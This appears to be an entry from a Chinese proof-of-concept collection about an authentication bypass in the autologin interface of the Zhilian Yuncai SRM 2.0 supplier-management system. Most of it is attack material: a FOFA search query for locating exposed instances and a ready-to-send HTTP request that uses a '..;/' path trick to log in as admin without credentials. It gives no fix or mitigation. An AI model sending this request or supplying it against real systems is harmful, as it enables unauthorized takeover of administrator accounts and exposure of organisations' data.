# 智联云采SRM2.0系统接口autologin身份认证绕过漏洞

由于智联云采 SRM2.0 autologin 接口代码逻辑存在缺陷，导致未授权的攻击者可以构造特殊绕过身份认证直接以管理员身份接管后台，造成信息泄露，使系统处于极不安全的状态。

## fofa

```yaml
title=="SRM 2.0"
```

## poc

```java
GET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1
Host: 
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409031840266.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409031840544.png)